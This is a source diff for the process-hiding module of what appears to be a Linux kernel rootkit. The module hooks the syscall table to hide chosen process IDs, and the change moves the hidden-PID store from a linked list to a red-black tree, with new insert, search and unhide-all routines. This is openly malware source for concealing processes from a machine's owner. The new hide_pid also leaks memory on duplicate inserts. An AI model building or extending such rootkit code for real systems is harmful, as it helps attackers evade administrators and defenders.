@@ -2,24 +2,28 @@
 #include <asm/current.h>
 #include <linux/sched.h>
 #include <linux/sched/task.h>
+#include <linux/rbtree.h>
 
 #include "hidepid.h"
-#include "list.h"
 #include "log.h"
 #include "hook.h"
 
-// TODO: Using a List_t just to store pid_t types means a lot of overhead
-// but as a first approach is ok.
-List_t *__hidden_pid_list = NULL;
-unsigned long *__sct = NULL;
+typedef struct hidden_pid {
+    struct rb_node node;
+
+    pid_t pid;
+} __HiddenPid_t;
+
+// TODO: Is it really worth using a RB-Tree to keep track of pid_t?
+struct rb_root __hidden_pid_list = RB_ROOT;
 
 // We depend on hook subsystem to have this information.
-//extern unsigned long *__sct;
+unsigned long *__sct = NULL;
 
 // TODO: Document functions.
 
 static inline int __hidepid_initialized(void) {
-    return (__hidden_pid_list == NULL)? 0: 0x01ec0ded;
+    return __sct == NULL? 0: 0x01ec0ded;
 }
 
 /**
@@ -36,6 +40,80 @@ static inline int __pid_is_self(pid_t pid) {
     return (current->pid == pid || pid == 0)? 0x01ec0ded: 0;
 }
 
+static __HiddenPid_t * __HiddenPid_search(struct rb_root *tree, pid_t pid) {
+    __HiddenPid_t *entry;
+    struct rb_node *iter;
+
+    if (tree == NULL) {
+        yarr_log("Tree is NULL, in theory this is not possible!!!");
+        return NULL;
+    }
+
+    iter = tree->rb_node;
+    while (iter != NULL) {
+        entry = rb_entry(iter, __HiddenPid_t, node);
+        if (entry->pid > pid) {
+            iter = iter->rb_left;
+        } else if (entry->pid < pid) {
+            iter = iter->rb_right;
+        } else {
+            return entry;
+        }
+    }
+
+    return NULL;
+}
+
+static int __HiddenPid_insert(struct rb_root *tree, __HiddenPid_t *new_entry) {
+    __HiddenPid_t *entry;
+    struct rb_node **link, *parent;
+
+    if (tree == NULL || new_entry == NULL) {
+        yarr_log("Argument is NULL");
+        return -1;
+    } 
+
+    link = &tree->rb_node;
+    parent = NULL;
+    while (*link != NULL) {
+        entry = rb_entry(*link, __HiddenPid_t, node);
+        parent = *link;
+
+        if (entry->pid > new_entry->pid) {
+            link = &((*link)->rb_left);
+        } else if (entry->pid < new_entry->pid) {
+            link = &((*link)->rb_right);
+        } else {
+            // TODO: Return a code.
+            return -2;
+        }
+    }
+
+    rb_link_node(&new_entry->node, parent, link);
+    rb_insert_color(&new_entry->node, tree);
+    return 0;
+}
+
+static int __HiddenPid_init(__HiddenPid_t *this, pid_t pid) {
+    if (this == NULL) {
+        yarr_log("this is NULL");
+        return -1;
+    }
+
+    this->pid = pid;
+    this->node.rb_left = NULL;
+    this->node.rb_right = NULL;
+    return 0;
+}
+
+static void __HiddenPid_free(__HiddenPid_t *this) {
+    if (this != NULL) {
+        kfree(this);
+    }
+
+    return;
+}
+
 /**
  * Checks if a pid is already hidden.
  *
@@ -43,47 +121,7 @@ static inline int __pid_is_self(pid_t pid) {
  * @return: Zero if pid is not hidden, non-zero if pid is hidden.
  */
 static inline int __pid_is_hidden(pid_t pid) {
-    if (!__hidepid_initialized()) {
-        return 0;
-    }
-
-    return List_itemIsContained(__hidden_pid_list, &pid);
-}
-
-static void __print_pid(pid_t *param) {
-    if (param == NULL) {
-        yarr_log("param is NULL");
-        return;
-    }
-
-    yarr_log("pid: %d", *param);
-    return;
-}
-
-// TODO: We are returning -1 on errors, -1 also means p1 < p2.
-static int __cmp_pid(pid_t *p1, pid_t *p2) {
-    if (p1 == NULL || p2 == NULL) {
-        yarr_log("p1 or p2 are NULL");
-        return -1;
-    }
-
-    if (*p1 < *p2) {
-        return -1;
-    } else if (*p1 > *p2) {
-        return 1;
-    } else {
-        return 0;
-    }
-}
-
-// We need such function as we allocate memory for pid_t for each element in
-// the list.
-static void __pid_t_free(pid_t *pid_ptr) {
-    if (pid_ptr != NULL) {
-        kfree(pid_ptr);
-    }
-
-    return;
+    return (__HiddenPid_search(&__hidden_pid_list, pid) == NULL)? 0: 1;
 }
 
 /* This is the list of syscalls that have the type pid_t among their arguments:
@@ -589,20 +627,6 @@ asmlinkage long __yarr__x64_sys_migrate_pages(const struct pt_regs *regs) {
 /*****************************************************************************/
 
 int hidepid_init(void) {
-    if (__hidepid_initialized()) {
-        yarr_log("Double initialization detected");
-        return 0;
-    }
-
-    __hidden_pid_list = List_create(
-            (void *)__print_pid,
-            (void *)__cmp_pid,
-            (void *)__pid_t_free);
-    if (__hidden_pid_list == NULL) {
-        yarr_log("Couldn't create __hidden_pid_list");
-        return -1;
-    }
-
     __sct = get_original_syscall_table64();
     if (__sct == NULL) {
         yarr_log("__sct is NULL, hook subsystem initialized?");
@@ -613,12 +637,8 @@ int hidepid_init(void) {
 }
 
 int hidepid_finish(void) {
-    if (!__hidepid_initialized()) {
-        return 0;
-    }
-
-    List_destroy(__hidden_pid_list);
-    __hidden_pid_list = NULL;
+    unhide_pid_all();
+    __hidden_pid_list = RB_ROOT;
     __sct = NULL;
 
     return 0;
@@ -657,55 +677,50 @@ int hidepid_install_hooks(void) {
 }
 
 int hide_pid(pid_t pid) {
-    pid_t *pid_data;
+    __HiddenPid_t *new_entry;
     int err;
 
-    if (!__hidepid_initialized()) {
-        yarr_log("Hidepid subsystem not initialized");
+    new_entry = kmalloc(sizeof(__HiddenPid_t), GFP_KERNEL);
+    if (new_entry == NULL) {
+        yarr_log("Couldn't allocate memory for new entry");
         return -1;
     }
 
-    if (__pid_is_hidden(pid)) {
-        return 0;
-    }
-
-    pid_data = kmalloc(sizeof(pid_t), GFP_KERNEL);
-    if (pid_data == NULL) {
-        yarr_log("Couldn't allocate memory for pid");
-        return -1;
-    }
-
-    *pid_data = pid;
-    err = List_insertData(__hidden_pid_list, pid_data);
+    err = __HiddenPid_init(new_entry, pid);
     if (err) {
-        yarr_log("Error inserting pid in the list of hidden pids");
-        kfree(pid_data);
+        yarr_log("Error initializing pid");
         return -1;
     }
 
-    return 0;
+    return __HiddenPid_insert(&__hidden_pid_list, new_entry);
 }
 
 int unhide_pid(pid_t pid) {
-    ListItem_t *item;
-    int err;
+    __HiddenPid_t *entry;
 
-    if (!__hidepid_initialized()) {
-        yarr_log("Hidepid subsystem not initialize");
-        return -1;
+    entry = __HiddenPid_search(&__hidden_pid_list, pid);
+    if (entry != NULL) {
+        rb_erase(&entry->node, &__hidden_pid_list);
+        __HiddenPid_free(entry);
+        return 0;
     }
 
-    item = List_getItemByData(__hidden_pid_list, &pid);
-    if (item != NULL) {
-        err = List_removeItem(__hidden_pid_list, item);
-        if (err) {
-            yarr_log("Pid present but List_removeItem() returned error");
-            return -1;
-        }
+    return -1;
+}
 
-        ListItem_destroy(item, __hidden_pid_list->free_data);
+void unhide_pid_all(void) {
+    __HiddenPid_t *entry;
+    struct rb_node *iter, *next;
+
+    iter = rb_first(&__hidden_pid_list);
+    while (iter != NULL) {
+        entry = rb_entry(iter, __HiddenPid_t, node);
+
+        next = rb_next(iter);
+        rb_erase(&entry->node, &__hidden_pid_list);
+
+        __HiddenPid_free(entry);
+        iter = next;
     }
-
-    return 0;
 }
 
